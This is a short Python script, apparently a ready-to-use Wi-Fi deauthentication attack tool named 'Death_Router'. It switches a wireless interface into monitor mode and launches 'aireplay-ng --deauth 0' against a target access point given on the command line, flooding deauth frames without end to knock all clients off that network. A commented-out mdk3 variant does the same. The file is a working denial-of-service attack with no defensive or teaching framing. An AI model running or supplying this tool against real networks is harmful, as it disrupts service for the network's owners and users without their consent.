#!/usr/bin/env python3

import subprocess
import os 
from subprocess import PIPE
import argparse
import sys

class Death_Router:

      def __init__(self):
          self.args_Control()
          self.death_wifi()
      def death_wifi(self):    
          Snake_interface  = [
                               "sudo ifconfig wlansnake down",
                               "sudo iwconfig wlansnake mode Monitor",
                               "sudo ifconfig wlansnake up"
                             ]
          for _ in Snake_interface :
              set_airmon_snake = subprocess.call( _ ,shell=True,stderr=subprocess.PIPE,stdout=PIPE) 
          command = "sudo aireplay-ng --deauth 0  -a "+f'{self.args.Death} '+" wlansnake "  
         # command = " sudo mdk3 "+f"{self.args.Interface}"+"mon "+" d  -t "+  f'{self.args.Death} '   
          command_proc = ' gnome-terminal  -e ' +'"' +  command   +" --ignore-negative-one"+'"'                  
          call_termminal = subprocess.call(command_proc,shell=True,stderr=subprocess.PIPE)                            
      def args_Control(self):
            parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")
            parser.add_argument( '-I ',"--Interface" )               
            parser.add_argument( '-D ',"--Death")
            parser.add_argument( '-AP ',"--APName")
            self.args = parser.parse_args()
            if len(sys.argv)> 1 :
                 pass
            else:
                 parser.print_help()
                 exit()                   
if __name__=='__main__':
    Death_Router()


